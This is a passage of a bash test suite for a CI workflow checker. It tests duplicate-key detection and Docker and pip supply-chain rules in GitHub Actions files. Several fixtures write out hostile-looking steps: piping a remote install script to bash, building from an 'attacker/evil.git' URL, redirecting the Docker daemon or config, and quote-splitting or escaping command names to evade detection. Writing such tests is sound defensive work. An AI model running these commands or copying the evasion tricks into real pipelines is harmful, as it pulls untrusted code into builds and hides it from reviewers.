case_out pm-matrix-twice-last-bad bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n      matrix:\n        runner: [macos-14]\n')")" 'runs-on'
case_out pm-extra-strategy-key   bad "$(mx "$M" "$(printf '    strategy:\n      max-parallel: 1\n      matrix:\n        runner: [ubuntu-24.04]\n')")" 'runs-on'
# a second `strategy` key (YAML keeps the last): here the LAST one is the invalid one, so a reader that takes the first is fooled
case_out pm-second-strategy-key  bad "$(mx "$M" "$(printf '    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n    strategy:\n      max-parallel: 1\n      matrix:\n        runner: [ubuntu-24.04]\n')")" 'runs-on'
# a key given twice in a job, in its strategy or in its matrix is refused with the key named, whatever its last copy holds (YAML keeps
# the last copy; GitHub rejects the file). `dupjob` builds the job around the duplicated part: <extra job keys> <strategy block>.
dupjob() { printf 'on: push\njobs:\n  apk:\n%s\n    steps:\n      - run: bash bin/build.sh' "$1"; }
OKS='    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n'
case_out pm-dup-job-key-valid          bad "$(dupjob "$(printf '    name: one\n    name: two\n    runs-on: ${{ matrix.runner }}\n'"$OKS")")" "duplicate key 'name'"
case_out pm-dup-job-key-invalid-last   bad "$(dupjob "$(printf '    container: alpine@'"$DIG"'\n    container: alpine:3.20\n    runs-on: ${{ matrix.runner }}\n'"$OKS")")" "duplicate key 'container'"
case_out pm-dup-runs-on-valid-last     bad "$(dupjob "$(printf '    runs-on: self-hosted\n    runs-on: ${{ matrix.runner }}\n'"$OKS")")" "duplicate key 'runs-on'"
case_out pm-dup-runs-on-invalid-last   bad "$(dupjob "$(printf '    runs-on: ${{ matrix.runner }}\n    runs-on: macos-14\n'"$OKS")")" "duplicate key 'runs-on'"
case_out pm-dup-strategy-valid-last    bad "$(dupjob "$(printf '    runs-on: ${{ matrix.runner }}\n    strategy:\n      max-parallel: 1\n      matrix:\n        runner: [ubuntu-24.04]\n'"$OKS")")" "duplicate key 'strategy'"
case_out pm-dup-strategy-invalid-last  bad "$(dupjob "$(printf '    runs-on: ${{ matrix.runner }}\n'"$OKS"'    strategy:\n      max-parallel: 1\n      matrix:\n        runner: [ubuntu-24.04]\n')")" "duplicate key 'strategy'"
case_out pm-dup-matrix-valid-last      bad "$(dupjob "$(printf '    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [macos-14]\n      matrix:\n        runner: [ubuntu-24.04]\n')")" "duplicate key 'matrix'"
case_out pm-dup-matrix-invalid-last    bad "$(dupjob "$(printf '    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n      matrix:\n        runner: [macos-14]\n')")" "duplicate key 'matrix'"
# a reusable-workflow call job is a job too
case_out pm-dup-key-in-a-call-job      bad "on: push
jobs:
  c:
    uses: ./.github/workflows/w.yml
    uses: ./.github/workflows/w.yml" "duplicate key 'uses'"
case_out pm-other-job-matrix     bad "on: push
jobs:
  a:
    runs-on: ubuntu-24.04
    strategy:
      matrix:
        runner: [ubuntu-24.04]
    steps:
      - run: true
  b:
    runs-on: \${{ matrix.runner }}
    steps:
      - run: true" 'jobs\.b\.runs-on'
case_out pm-workflow-level       bad "on: push
strategy:
  matrix:
    runner: [ubuntu-24.04]
jobs:
  a:
    runs-on: \${{ matrix.runner }}
    steps:
      - run: true" 'runs-on'
# any YAML anchor in the file is refused, whatever it anchors (AC2: file-wide)
case_out pm-anchored-matrix      bad "on: push
x-m: &m
  runner: [ubuntu-24.04]
jobs:
  a:
    runs-on: \${{ matrix.runner }}
    strategy:
      matrix: *m
    steps:
      - run: true" 'anchor'
# an unresolved runs-on is a finding about the runner (it names the job), never only a pwsh misreading of the steps
case_out pm-unresolved-names-the-runner bad "$(mx '${{ inputs.runner }}' "$(st "$BOTH")")" "jobs\\.apk\\.runs-on: .* is not an ubuntu runner"
# scope: the runner rule is read in .github/workflows/ files only; in another .github YAML file a valid matrix reads as bash and an
# unresolved runs-on only makes its steps read as pwsh (a finding of its own, no runs-on finding)
OTHER_OK='on: push\njobs:\n  a:\n    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [ubuntu-24.04]\n    steps:\n      - run: bash bin/build.sh\n'
OTHER_UNRESOLVED='on: push\njobs:\n  a:\n    runs-on: ${{ inputs.runner }}\n    steps:\n      - run: bash bin/build.sh\n'
W_PLAIN='on: push
jobs:
  j:
    runs-on: ubuntu-latest
    steps:
      - run: true'
case_out pm-scope-other-file-valid      ok  "$W_PLAIN" '0 finding' 'pwsh|runs-on' "printf '$OTHER_OK' > .github/other.yml"
case_out pm-scope-other-file-unresolved bad "$W_PLAIN" 'other\.yml.*a `pwsh` step' 'runs-on' "printf '$OTHER_UNRESOLVED' > .github/other.yml"
OTHER_WINDOWS='on: push\njobs:\n  a:\n    runs-on: ${{ matrix.runner }}\n    strategy:\n      matrix:\n        runner: [windows-2022]\n    steps:\n      - run: bash bin/build.sh\n'
case_out pm-scope-other-file-windows    bad "$W_PLAIN" 'other\.yml.*a `pwsh` step' 'runs-on' "printf '$OTHER_WINDOWS' > .github/other.yml"
PM_EXPECT=84
if [ "$pm_run" = "$PM_EXPECT" ]; then pass=$((pass+1)); echo "PASS pm-case-count → $pm_run"
else failn=$((failn+1)); echo "FAIL pm-case-count → $pm_run cases ran, want $PM_EXPECT"; fi

# --- REQ-REL-005-AC3 (the advisor's AC2b): in a workflow file, or an action.yml/action.yaml under .github/, two keys of one mapping
# that are equal once trimmed and lower-cased (the way the checker reads keys) are a finding that names every spelling and the
# path of the mapping (`<file>.jobs.j.steps[0]: duplicate key 'run', 'Run'`), whatever the second value is. Keys are compared as
# YAML reads them, so quoting and escapes do not make two keys different. Every fixture is otherwise clean, so the repeated key is
# the only thing that can turn a case. `rk` writes a plain job `j` with the lines given after its runs-on.
rk_start=$pm_run
rk() { printf 'on: push\njobs:\n  j:\n    runs-on: ubuntu-24.04\n%s' "$1"; }
STEPS='    steps:
      - run: true'
# one case per mapping level
case_out rk-top-level-key    bad "name: one
name: two
$(rk "$STEPS")" "w\\.yml: duplicate key 'name'"
case_out rk-job-id           bad "$(rk "$STEPS")
  j:
    runs-on: ubuntu-24.04
    steps:
      - run: true" "w\\.yml\\.jobs: duplicate key 'j'"
case_out rk-step-run         bad "$(rk '    steps:
      - run: true
        run: bash bin/build.sh')" "w\\.yml\\.jobs\\.j\\.steps\\[0\\]: duplicate key 'run'"
case_out rk-step-shell       bad "$(rk '    steps:
      - run: true
        shell: pwsh
        shell: bash')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'shell'"
case_out rk-defaults-shell   bad "$(rk '    defaults:
      run:
        shell: pwsh
        shell: bash
'"$STEPS")" "jobs\\.j\\.defaults\\.run: duplicate key 'shell'"
case_out rk-workflow-env     bad "env:
  GREETING: hello
  GREETING: bye
$(rk "$STEPS")" "w\\.yml\\.env: duplicate key 'GREETING'"
case_out rk-step-env         bad "$(rk '    steps:
      - run: true
        env:
          GREETING: hello
          GREETING: bye')" "jobs\\.j\\.steps\\[0\\]\\.env: duplicate key 'GREETING'"
case_out rk-with-input       bad "$(rk "    steps:
      - uses: actions/checkout@$SHA # v7.0.1
        with:
          fetch-depth: 1
          fetch-depth: 0")" "jobs\\.j\\.steps\\[0\\]\\.with: duplicate key 'fetch-depth'"
case_out rk-permissions      bad "$(rk '    permissions:
      contents: read
      contents: write
'"$STEPS")" "jobs\\.j\\.permissions: duplicate key 'contents'"
case_out rk-service-name     bad "$(rk "    services:
      db: postgres@$DIG
      db: postgres@$DIG
$STEPS")" "jobs\\.j\\.services: duplicate key 'db'"
case_out rk-service-key      bad "$(rk "    services:
      db:
        image: postgres@$DIG
        image: postgres@$DIG
$STEPS")" "jobs\\.j\\.services\\.db: duplicate key 'image'"
case_out rk-container-key    bad "$(rk "    container:
      image: alpine@$DIG
      image: alpine@$DIG
$STEPS")" "jobs\\.j\\.container: duplicate key 'image'"
case_out rk-trigger          bad "on:
  push:
  push:
jobs:
  j:
    runs-on: ubuntu-24.04
$STEPS" "w\\.yml\\.on: duplicate key 'push'"
case_out rk-trigger-filter   bad "on:
  push:
    branches: [main]
    branches: [dev]
jobs:
  j:
    runs-on: ubuntu-24.04
$STEPS" "w\\.yml\\.on\\.push: duplicate key 'branches'"
case_out rk-job-outputs      bad "$(rk '    outputs:
      digest: one
      digest: two
'"$STEPS")" "jobs\\.j\\.outputs: duplicate key 'digest'"
# the same key in other spellings: plain, single-quoted, double-quoted and escaped are one key once YAML has read them
case_out rk-jobs-quoted      bad "$(rk "$STEPS")
\"jobs\":
  k:
    runs-on: ubuntu-24.04
$STEPS" "w\\.yml: duplicate key 'jobs'"
case_out rk-name-quote-styles bad "$(rk "    steps:
      - 'name': one
        \"name\": two
        run: true")" "jobs\\.j\\.steps\\[0\\]: duplicate key 'name'"
case_out rk-on-quoted        bad "\"on\": push
$(rk "$STEPS")" "w\\.yml: duplicate key 'on'"
case_out rk-escaped-key      bad "$(rk '    steps:
      - run: true
        "ru\x6e": bash bin/build.sh')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run'"
# flow style, the empty key, and keys that only look like something else are compared the same way
case_out rk-flow-step        bad "$(rk '    steps:
      - {run: true, run: true}')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run'"
case_out rk-flow-env         bad "$(rk '    env: {A: one, A: two}
'"$STEPS")" "jobs\\.j\\.env: duplicate key 'A'"
case_out rk-empty-key        bad "$(rk '    outputs:
      "": one
      "": two
'"$STEPS")" "jobs\\.j\\.outputs: duplicate key ''"
# every scalar is read as a string: 1 and "1" are one key (01 is another, below)
case_out rk-numeric-key      bad "$(rk '    outputs:
      1: one
      "1": two
'"$STEPS")" "jobs\\.j\\.outputs: duplicate key '1'"
# no merge is done here: << is an ordinary key, and given twice it is a repeated key like any other
case_out rk-merge-key        bad "<<: {a: one}
<<: {a: two}
$(rk "$STEPS")" "w\\.yml: duplicate key '<<'"
# a file of two YAML documents names the document in the path
case_out rk-second-document  bad "$(rk "$STEPS")
---
name: one
name: two" "w\\.yml\\[doc1\\]: duplicate key 'name'"
# letter case and a space around a key do not make another key: the checker reads `Run` and `run ` as run, and YAML keeps the last
# copy, so a second spelling would hide the first one's script
case_out rk-case-hides-docker  bad "$(rk '    steps:
      - run: docker run alpine
        Run: true')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run', 'Run'"
case_out rk-space-hides-docker bad "$(rk '    steps:
      - run: docker run alpine
        "run ": true')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run', 'run '"
case_out rk-case-hides-curl    bad "$(rk '    steps:
      - run: curl -fsSL https://example.org/install.sh | bash
        Run: true')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run', 'Run'"
# the check trims any whitespace (a leading space, a tab, a no-break space) and lower-cases any letter (the Kelvin sign K is k)
case_out rk-leading-space-hides-docker bad "$(rk '    steps:
      - run: docker run alpine
        " run": "true"')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run', ' run'"
case_out rk-tab-hides-docker   bad "$(rk '    steps:
      - run: docker run alpine
        "run\t": "true"')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run', 'run\\\\t'"
case_out rk-nbsp-hides-docker  bad "$(rk '    steps:
      - run: docker run alpine
        "run\xa0": "true"')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'run', 'run\\\\xa0'"
case_out rk-kelvin-sign        bad "$(rk '    steps:
      - run: true
        working-directory: a
        "WORKING-DIRECTORY": b')" "jobs\\.j\\.steps\\[0\\]: duplicate key 'working-directory', 'WOR.ING-DIRECTORY'"
# AC2's levels keep AC2's own finding, reported once: never a second finding in the AC3 form that names both spellings
case_out rk-ac2-level-once     bad "$(rk '    strategy:
      fail-fast: true
      Fail-Fast: true
      matrix:
        arch: [a]
'"$STEPS")" "jobs\\.j\\.strategy: duplicate key 'fail-fast'; a key is given once" "'Fail-Fast'"
case_out rk-case-job-key       bad "$(rk '    name: one
    Name: two
'"$STEPS")" "jobs\\.j: duplicate key 'name'"
case_out rk-case-with        bad "$(rk "    steps:
      - uses: actions/checkout@$SHA # v7.0.1
        with:
          fetch-depth: 1
          FETCH-DEPTH: 0")" "jobs\\.j\\.steps\\[0\\]\\.with: duplicate key 'fetch-depth', 'FETCH-DEPTH'"
case_out rk-case-workflow-env bad "env:
  TARGET: one
  target: two
$(rk "$STEPS")" "w\\.yml\\.env: duplicate key 'TARGET', 'target'"
case_out rk-case-job-env     bad "$(rk '    env:
      TARGET: one
      target: two
'"$STEPS")" "jobs\\.j\\.env: duplicate key 'TARGET', 'target'"
case_out rk-case-step-env    bad "$(rk '    steps:
      - run: true
        env:
          TARGET: one
          target: two')" "jobs\\.j\\.steps\\[0\\]\\.env: duplicate key 'TARGET', 'target'"
case_out rk-case-call-with   bad "on: push
jobs:
  c:
    uses: ./.github/workflows/w.yml
    with:
      mode: one
      MODE: two" "jobs\\.c\\.with: duplicate key 'mode', 'MODE'"
case_out rk-case-call-secrets bad "on: push
jobs:
  c:
    uses: ./.github/workflows/w.yml
    secrets:
      token: one
      Token: two" "jobs\\.c\\.secrets: duplicate key 'token', 'Token'"
# three copies in two spellings are one finding that names each spelling once, in file order
case_out rk-case-three-copies bad "$(rk '    env:
      a: one
      A: two
      a: three
'"$STEPS")" "jobs\\.j\\.env: duplicate key 'a', 'A';"
# action files: an action.yml or action.yaml anywhere under .github/ is read too
ACTION_RUN_TWICE='name: x\ndescription: x\nruns:\n  using: composite\n  steps:\n    - run: "true"\n      run: "true"\n      shell: bash\n'
ACTION_RUN_CASE='name: x\ndescription: x\nruns:\n  using: composite\n  steps:\n    - run: docker run alpine\n      Run: "true"\n      shell: bash\n'
case_out rk-action-yml       bad "$(rk "$STEPS")" "actions/x/action\\.yml\\.runs\\.steps\\[0\\]: duplicate key 'run'" '' \
  "mkdir -p .github/actions/x && printf '$ACTION_RUN_TWICE' > .github/actions/x/action.yml"
case_out rk-action-yaml-deep bad "$(rk "$STEPS")" "some/action\\.yaml\\.runs\\.steps\\[0\\]: duplicate key 'run'" '' \
  "mkdir -p .github/agent/some && printf '$ACTION_RUN_TWICE' > .github/agent/some/action.yaml"
case_out rk-action-case      bad "$(rk "$STEPS")" "actions/x/action\\.yml\\.runs\\.steps\\[0\\]: duplicate key 'run', 'Run'" '' \
  "mkdir -p .github/actions/x && printf '$ACTION_RUN_CASE' > .github/actions/x/action.yml"
case_out rk-action-yml-capital bad "$(rk "$STEPS")" "actions/z/Action\\.yml\\.runs\\.steps\\[0\\]: duplicate key 'run'" '' \
  "mkdir -p .github/actions/z && printf '$ACTION_RUN_TWICE' > .github/actions/z/Action.yml"
# controls: keys that differ, or the same key in different mappings, stay accepted
case_out rk-same-key-other-mappings ok "env:
  GREETING: hello
$(rk '    env:
      GREETING: hello
    steps:
      - name: one
        run: true
        env:
          GREETING: hello
      - name: two
        run: true')" '0 finding' 'duplicate key'
# keys of genuinely different text stay two keys
case_out rk-run-and-runs     ok  "$(rk '    outputs:
      run: one
      runs: two
'"$STEPS")" '0 finding' 'duplicate key'
case_out rk-numeric-spellings ok "$(rk '    outputs:
      1: one
      01: two
'"$STEPS")" '0 finding' 'duplicate key'
# lower-cased, never case-folded: STRASSE and STRAßE stay two keys (case folding would make both strasse)
# a full-width ｒｕｎ is not run: keys are lower-cased, never normalized first
case_out rk-full-width       ok  "$(rk '    steps:
      - run: true
        "ｒｕｎ": "true"')" '0 finding' 'duplicate key'
case_out rk-sharp-s          ok  "$(rk '    env:
      STRASSE: one
      "STRAßE": two
'"$STEPS")" '0 finding' 'duplicate key'
# keys inside a block scalar are script text, not keys
case_out rk-block-scalar     ok  "$(rk '    steps:
      - run: |
          a: 1
          a: 2')" '0 finding' 'duplicate key'
case_out rk-include-lookalike ok "$(rk '    strategy:
      matrix:
        include:
          - arch: amd64
        my-include: [one]
'"$STEPS")" '0 finding' 'duplicate key'
# an anchor keeps its file-wide refusal (the file is not read further); a repeated key in another YAML file under .github/ (not a
# workflow, not an action file) is not this check's finding
case_out rk-anchor-file-wide bad "x-a: &a one
$(rk '    steps:
      - run: true
        run: true')" 'anchor' 'duplicate key'
case_out rk-scope-other-file ok  "$(rk "$STEPS")" '0 finding' 'duplicate key' \
  "printf 'name: one\\nname: two\\nenv:\\n  A: one\\n  a: two\\n' > .github/other.yml"
case_out rk-scope-agent-fixture ok "$(rk "$STEPS")" '0 finding' 'duplicate key' \
  "mkdir -p .github/agent/fixtures && printf 'name: one\\nname: two\\n' > .github/agent/fixtures/x.yml"
RK_EXPECT=55
if [ $((pm_run - rk_start)) = "$RK_EXPECT" ]; then pass=$((pass+1)); echo "PASS rk-case-count → $RK_EXPECT"
else failn=$((failn+1)); echo "FAIL rk-case-count → $((pm_run - rk_start)) cases ran, want $RK_EXPECT"; fi
# --- Sonnet #164 r9 (NEW-11): a command name computed by a substitution fused into the word fails closed
case_ n11-fused-docker         bad "$(rb 'd$()ocker run alpine')"
case_ n11-fused-pip            bad "$(rb 'pi$()p install requests')"
case_ n11-fused-backtick       bad "$(rb 'doc``ker pull alpine')"
case_ n11-wrapper-fused        bad "$(rb 'timeout 5 d$()ocker run alpine')"
case_ n11-whole-subst-command  bad "$(rb '$(echo docker) run alpine')"
case_ n11-subst-in-argument-ok ok  "$(rb 'echo "built at $(date)"; tag="v$(cat VERSION)"')"
# --- Sonnet #164 r10 (NEW-12): any non-POSIX shell step is refused outright (this check reads POSIX shell only)
case_ n12-pwsh-backtick        bad "$head
    steps:
      - shell: pwsh
        run: doc\\\`ker run alpine"
case_ n12-pwsh-concat          bad "$head
    steps:
      - shell: pwsh
        run: \\\$d = 'dock'; & \\\"\\\${d}er\\\" run alpine"
case_ n12-python-shell         bad "$head
    steps:
      - shell: python
        run: print('hi')"
case_ n12-bash-template-ok     ok  "$head
    steps:
      - shell: bash --noprofile --norc -eo pipefail {0}
        run: echo hi"
# --- Sonnet #164 r11 (NEW-13): a registry-qualified template never stands for "our own bytes"
case_ n13-registry-template    bad "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 ghcr.io/myorg/approved-${GITHUB_SHA}; docker run ghcr.io/myorg/approved-other')"
case_ n13-registry-exact-localtrust-removed-bad bad  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 ghcr.io/myorg/approved; docker run ghcr.io/myorg/approved')"
case_ n13-local-template-localtrust-removed-bad bad  "$(rb 'for v in production debug; do docker tag "$src" "fa-${v}"; done; docker run fa-production')"
case_ c10-template-not-listed  bad "$(rb 'for v in a b; do docker tag "$src" "fa-${v}"; done; docker run fa-production')"
# --- Sonnet #164 r12 (NEW-14, NEW-15): every verb is checked, on a reviewed safe list, or refused
case_ n14-podman-kube-play     bad "$(r 'podman kube play pod.yaml')"
case_ n14-podman-play-kube     bad "$(r 'podman play kube pod.yaml')"
case_ n14-docker-unknown-verb  bad "$(r 'docker frobnicate alpine')"
case_ n15-skopeo-sync          bad "$(r 'skopeo sync --src docker --dest dir alpine /tmp/x')"
case_ n15-crane-append         bad "$(r 'crane append -b alpine:3 -f layer.tar -t ghcr.io/x/y:1')"
case_ n15-crane-mutate         bad "$(r 'crane mutate alpine:3 --entrypoint=sh')"
case_ safe-verbs-ok            ok  "$(rb 'docker login ghcr.io -u x --password-stdin <<<t; docker images; docker ps; docker rm -f x; docker logs x; docker inspect x; docker exec x true; docker push ghcr.io/x/y:1; docker load -i a.tar; docker network create n; docker buildx imagetools inspect x; skopeo inspect --raw docker://x@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667; crane digest x; crane ls x')"
case_ scout-local-ok            ok  "$(rb 'docker scout sbom --format json "local://${ref}" > "${d}/sbom.json"; docker scout cves --format gitlab --vex-location v.json "local://${ref}" > o 2>&1')"
case_ scout-registry-unpinned  bad "$(r 'docker scout cves alpine:latest')"
case_ scout-unknown-option     bad "$(r 'docker scout cves --frob x local://img')"
case_ lookup-not-a-run-ok      ok  "$(r 'command -v skopeo >/dev/null 2>&1 || which docker; type crane')"
case_ prose-in-quotes-ok       ok  "$(rb 'gh release create v1 --notes "images (GHCR canonical, Docker Hub mirror) and more"')"
case_ scout-bare-ok             ok  "$(r 'docker scout')"
case_ scout-flags-ok            ok  "$(r 'docker scout cves --exit-code --format=json local://img')"
case_ safe-subverbs-ok          ok  "$(r 'docker image ls; docker manifest inspect ghcr.io/x/y:1; docker container ls')"
# --- Sonnet #164 r13 (NEW-16..20): no privileged plugins, no daemon redirection, no remote builders, no URL imports
case_ n16-plugin-install       bad "$(r 'docker plugin install vieux/sshfs')"
case_ n17-context-use          bad "$(r 'docker context use remote')"
case_ n18-global-host          bad "$(r 'docker -H tcp://x:2375 ps')"
case_ n18-global-context       bad "$(r 'docker --context remote ps')"
case_ n18-env-docker-host      bad "$(rb 'export DOCKER_HOST=tcp://x:2375; docker ps')"
case_ n18-prefix-docker-host   bad "$(r 'DOCKER_HOST=tcp://x docker ps')"
case_ n18-yaml-env             bad "$head
    env:
      DOCKER_HOST: tcp://x:2375
    steps:
      - run: docker ps"
case_ n18-buildkit-host        bad "$(rb 'export BUILDKIT_HOST=tcp://x; docker buildx ls')"
case_ n18-config-other         bad "$(rb 'export DOCKER_CONFIG=/tmp/attacker; docker ps')"
case_ n18-config-fresh-ok      ok  "$(rb 'DOCKER_CONFIG=$(mktemp -d); export DOCKER_CONFIG; docker ps')"
case_ n19-buildx-remote        bad "$(r 'docker buildx create --driver remote tcp://x:1234 --use')"
case_ n20-import-url           bad "$(r 'docker import https://x.example/rootfs.tar img:1')"
# --- Sonnet #164 r14 (NEW-21, NEW-22): a loaded tarball or an archive copy is never "the job's own bytes"
case_ n21-load-tag-run         bad "$(rb 'curl -sL https://x.example/i.tar -o i.tar; docker load -i i.tar; docker tag sha256:deadbeef myname:latest; docker run myname:latest')"
case_ n21-tag-unpinned-src     bad "$(rb 'docker tag alpine:latest mine; docker run mine')"
case_ n21-tag-pinned-src-localtrust-removed-bad bad  "$(rb 'docker tag alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 mine; docker run mine')"
case_ n21-tag-variable-src-localtrust-removed-bad bad  "$(rb 'for v in production fips; do docker tag "${repo}@${d}" "fa-${v}"; done; docker run fa-production')"
case_ c10-template-no-list     bad "$(rb 'docker tag "${repo}@${d}" "fa-${v}"; docker run fa-production')"
case_ n22-archive-to-daemon-run bad "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; docker run img:1')"
case_ n22-archive-scan-ok      ok  "$(rb 'skopeo copy oci-archive:/tmp/x.oci docker-daemon:img:1; grype docker:img:1; docker scout cves local://img:1')"
case_ n22-pinned-to-daemon-localtrust-removed-bad bad  "$(rb 'skopeo copy docker://alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667 docker-daemon:img:1; docker run img:1')"
# --- Sonnet #164 r15 (NEW-23): a build's context must be a local path; remote or computed contexts are refused
case_ n23-git-url-context      bad "$(r 'docker build https://github.com/attacker/evil.git -f go.mod -t x')" "touch go.mod; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-git-scheme-context   bad "$(r 'docker build git://example.org/r.git -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-git-ssh-context      bad "$(r 'docker build git@github.com:a/b.git -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-tarball-url-context  bad "$(r 'docker buildx build https://x.example/ctx.tar.gz -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-variable-context     bad "$(rb 'docker build -t x "$CTX"')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-build-context-image  bad "$(r 'docker buildx build --build-context base=docker-image://alpine:latest -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-build-context-local-ok ok "$(r 'docker buildx build --build-context src=./src -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
case_ n23-local-subdir-ok      ok  "$(r 'docker build -f build/Dockerfile -t x build')" "mkdir -p build; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/Dockerfile"
# --- Sonnet #164 r16 (NEW-24): the default Dockerfile is <context>/Dockerfile; a moved working directory makes literal paths unresolvable
case_ n24-context-dockerfile   bad "$(r 'docker build ./subdir -t x')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p subdir; printf 'FROM alpine:latest\\n' > subdir/Dockerfile"
case_ n24-context-pinned-ok    ok  "$(r 'docker build ./subdir -t x')" "mkdir -p subdir; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > subdir/Dockerfile"
case_ n24-cd-literal           bad "$(rb 'cd sub && docker build -f Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n24-working-directory    bad "$head
    steps:
      - working-directory: sub
        run: docker build -f Dockerfile -t x ." "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p sub; printf 'FROM alpine:latest\\n' > sub/Dockerfile"
case_ n24-cd-template-ok       ok  "$(rb 'cp build/docker/Dockerfile.* /tmp/ctx/ && cd /tmp/ctx && docker build -f Dockerfile.$v .')" "mkdir -p build/docker; printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > build/docker/Dockerfile.a"
case_ n24-dot-slash-ok          ok  "$(r 'docker build -f ./Dockerfile -t x .')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile"
# --- Sonnet #164 r17 (NEW-25, NEW-26): a cd / pushd anywhere in the step, quoted or nested, moves the working directory;
#     a pip -r file read from a moved working directory is refused like a Dockerfile
case_ n25-sh-c-quoted-cd       bad "$(rb "sh -c 'cd evil && docker build -f Dockerfile -t x .'")" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n25-eval-quoted-cd       bad "$(rb 'eval "cd evil && docker build -f Dockerfile -t x ."')" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n25-quoted-cd-word       bad "$(rb "'cd' evil; docker build -f Dockerfile -t x .")" "printf 'FROM alpine@sha256:b1934ee5f1c509618f2508e6eb47ee0d3520686341fec936f3b79331f9315667\\n' > Dockerfile; mkdir -p evil; printf 'FROM ubuntu:latest\\n' > evil/Dockerfile"
case_ n26-cd-pip-r             bad "$(rb 'cd sub; pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p sub; printf 'evil==9 --hash=sha256:11\\n' > sub/requirements.txt"
case_ n26-wd-pip-r             bad "$head
    steps:
      - working-directory: sub
        run: pip install --require-hashes -r requirements.txt" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt; mkdir -p sub; printf 'evil==9 --hash=sha256:11\\n' > sub/requirements.txt"
case_ n26-pip-r-root-ok        ok  "$(rb 'pip install --require-hashes -r requirements.txt')" "printf 'x==1 --hash=sha256:00\\n' > requirements.txt"
# --- Sonnet #164 r18 (NEW-27, NEW-28): quote-split words (d""ocker, c""d) defeat raw-text detectors; aliases and ANSI-C
#     quoting are refused outright (fail closed)
case_ n27-alias-split          bad "$(rb 'shopt -s expand_aliases; alias foo=d""ocker; foo run alpine:3.20')"
case_ n27-alias-any            bad "$(rb 'alias ll=ls; ll')"
case_ n27-expand-aliases       bad "$(rb 'shopt -s expand_aliases')"
case_ n27-ansi-c               bad "$(rb "\$'\\x64ocker' run alpine:3.20")"
case_ n27-ansi-c-octal         bad "$(rb "\$'\\144ocker' run alpine:3.20")"
case_ n27-ansi-c-tab-ok        ok  "$(rb "IFS=\$'\\t' read -r a b <<< \"x\"; printf '%s' \"\$a\$'\\n'\"")"
case_ n27-regex-anchor-ok      ok  "$(rb "grep -oE '[^ ]+\$' f.txt; echo \"a\$'b\"")"
# a shell comment's apostrophe does not open a quote: a later 'regex$' is not an ANSI-C string (rescan's probe step)
case_ ansi-comment-apostrophe-ok ok "$(rb "# the report's delta check
          grep -q '^x\$' \\
            /dev/null || true")"
case_ scout-vex-author-ok   ok  "$(rb "docker scout cves --format gitlab --vex-location ./v --vex-author '^A B\$' --only-vex-affected local://ghcr.io/x/y:t")"
case_ n27-ansi-in-dquote-text  bad "$(rb "echo \"x\" \$'\\x41'")"
